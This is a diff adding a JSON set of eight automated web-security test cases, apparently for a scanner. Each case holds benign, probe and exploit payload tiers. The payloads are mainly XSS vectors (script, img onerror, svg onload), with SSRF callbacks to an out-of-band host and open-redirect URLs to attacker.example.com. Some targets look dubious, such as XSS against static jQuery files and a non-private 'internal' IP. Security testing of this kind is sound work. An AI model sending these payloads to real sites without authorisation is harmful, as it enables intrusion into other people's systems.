@@ -1,0 +1,987 @@
+{
+  "test_cases": [
+    {
+      "id": "H1-TC1",
+      "hypothesis_id": "H1",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/vendor/counter-up/jquery.waypoints.min.js",
+      "parameter": "horizontal",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.horizontal",
+              "value": "normal"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.horizontal",
+              "value": "<script>1</script>"
+            },
+            {
+              "location": "query.horizontal",
+              "value": "'\";alert(1);//"
+            }
+          ],
+          "description": "Probe payloads to detect reflection without executing heavy payloads; use encoded forms by client as needed",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.horizontal",
+              "value": "\"><img src=x onerror=alert(1)>"
+            },
+            {
+              "location": "query.horizontal",
+              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "More active XSS-style vectors for reflection detection; ensure testing in safe environment and comply with max_requests",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Require valid session cookie observed in context",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "response body (text/javascript or text/plain) contains exact payload substring unencoded",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "compare baseline vs probe/exploit response length; flag if delta >=25% and HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.7
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "reflected",
+        "static-asset"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "H2-TC1",
+      "hypothesis_id": "H2",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/maps/embed",
+      "parameter": "pb",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.pb",
+              "value": "1"
+            }
+          ],
+          "description": "Baseline numeric benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.pb",
+              "value": "http://oob-server.example.com/ssrf-check"
+            },
+            {
+              "location": "query.pb",
+              "value": "http://168.192.0.1/"
+            }
+          ],
+          "description": "OOB callback URL to detect server-side fetch; second payload for internal IP style probe",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.pb",
+              "value": "http://oob-server.example.com/ssrf-exec?test=1"
+            }
+          ],
+          "description": "Confirmed external URL with unique token to detect callbacks within timing window",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Valid session cookie for application",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "http_callback",
+          "condition": "external OOB service receives DNS or HTTP interaction from target within 5000 ms of request",
+          "threshold": {
+            "timing_ms": 5000
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "HTTP response status differs from baseline or is one of [200,302,500,502,504] indicating server-side fetch behavior",
+          "threshold": {
+            "expected_codes": [
+              200,
+              302,
+              500,
+              502,
+              504
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "Monitor OOB service for callbacks; use unique token per request",
+      "tags": [
+        "ssrf",
+        "oob"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "H3-TC1",
+      "hypothesis_id": "H3",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/css",
+      "parameter": "family",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.family",
+              "value": "default"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.family",
+              "value": "http://example.com/redirect-test"
+            },
+            {
+              "location": "query.family",
+              "value": "//attacker.example.com/"
+            }
+          ],
+          "description": "Probe for open-redirect behavior by supplying URL-like values",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.family",
+              "value": "https://attacker.example.com/redirect?x=1"
+            }
+          ],
+          "description": "URL designed to trigger redirect if parameter is used unsafely",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Valid session cookie available",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "response status is a redirect (301/302/303/307/308) or differs from baseline when sending URL-like family values",
+          "threshold": {
+            "expected_codes": [
+              301,
+              302,
+              303,
+              307,
+              308,
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "response length delta >=40% between baseline and probe/exploit indicating content/redirect change",
+          "threshold": {
+            "body_length_delta_pct": 40.0,
+            "expected_codes": [
+              200,
+              301,
+              302
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 15
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "open-redirect"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "H4-TC1",
+      "hypothesis_id": "H4",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/assets/vendor/jquery/jquery.min.js",
+      "parameter": "object",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.object",
+              "value": "Array"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.object",
+              "value": "<svg><script>1</script></svg>"
+            },
+            {
+              "location": "query.object",
+              "value": "' onerror=1 //"
+            }
+          ],
+          "description": "Probe payloads to detect reflection in JavaScript DOM contexts",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.object",
+              "value": "%3Cscript%3Econsole.log(1)%3C%2Fscript%3E"
+            },
+            {
+              "location": "query.object",
+              "value": "\"><img src=x onerror=console.log(1)>"
+            }
+          ],
+          "description": "Active DOM XSS vectors for confirmation in controlled environment",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Authenticated session cookie if required",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "response JavaScript content contains payload substring unencoded or within DOM-manipulating code",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "response length changes by >=20% between baseline and payload requests with HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "dom"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "H5-TC1",
+      "hypothesis_id": "H5",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "config",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.config",
+              "value": "site"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.config",
+              "value": "<b>probe</b>"
+            },
+            {
+              "location": "query.config",
+              "value": "'\";alert(1)//"
+            }
+          ],
+          "description": "Probe for reflected HTML or script injection in page or inline scripts",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.config",
+              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            },
+            {
+              "location": "query.config",
+              "value": "\"><svg/onload=alert(1)>"
+            }
+          ],
+          "description": "Exploit-tier XSS vectors for confirmation under safe conditions",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Session cookie available",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "HTTP 200 response body (text/html) contains exact payload substring unencoded in HTML or script contexts",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "response length delta >=30% between baseline and probes with HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 25
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "reflected"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "H6-TC1",
+      "hypothesis_id": "H6",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "description",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.description",
+              "value": "about"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.description",
+              "value": "<i>probe</i>"
+            },
+            {
+              "location": "query.description",
+              "value": "\"'><script>1</script>"
+            }
+          ],
+          "description": "Probe for reflected HTML or script in metadata or page body",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.description",
+              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            },
+            {
+              "location": "query.description",
+              "value": "'><img src=x onerror=alert(1)>"
+            }
+          ],
+          "description": "Exploit-tier payloads for confirmation",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Valid session cookie present",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "page HTML contains exact probe/exploit payload substrings unencoded within body or metadata and HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=25% length delta between baseline and payload responses with HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 25
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "reflected"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "H7-TC1",
+      "hypothesis_id": "H7",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "theme-color",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.theme-color",
+              "value": "blue"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.theme-color",
+              "value": "#<script>1</script>"
+            },
+            {
+              "location": "query.theme-color",
+              "value": "' onload=1 //"
+            }
+          ],
+          "description": "Probe values to detect reflection into meta tags or inline CSS",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.theme-color",
+              "value": "\"> <script>alert(1)</script>"
+            },
+            {
+              "location": "query.theme-color",
+              "value": "%3Csvg%2Fonload%3Dalert(1)%3E"
+            }
+          ],
+          "description": "Exploit-tier vectors for confirmation in controlled environment",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Session cookie required",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "meta tags or inline styles in HTTP 200 response contain payload substring unencoded",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "response length delta >=20% between baseline and payload requests with HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "meta"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "H8-TC1",
+      "hypothesis_id": "H8",
+      "base_url": "https://HOST",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "viewport",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.viewport",
+              "value": "width=device-width"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.viewport",
+              "value": "width=<script>1</script>"
+            },
+            {
+              "location": "query.viewport",
+              "value": "initial-scale=1,minimum-scale=1<script>alert(1)</script>"
+            }
+          ],
+          "description": "Probe for injection into meta viewport or inline content",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.viewport",
+              "value": "width=\\\"><script>alert(1)</script>"
+            },
+            {
+              "location": "query.viewport",
+              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "Exploit-tier payloads for confirmation in safe test environment",
+          "header": [
+            {
+              "header_name": "Cookie",
+              "header_value": "connect.sid=SESSIONID"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Require session cookie if pages require it",
+          "extract_from": "connect.sid",
+          "bind_to": "SESSIONID"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "meta viewport or HTML contains unencoded payload substring in HTTP 200 responses",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=20% response length change between baseline and probes with HTTP 200",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "tags": [
+        "xss",
+        "viewport"
+      ],
+      "estimated_duration": 60
+    }
+  ]
+}
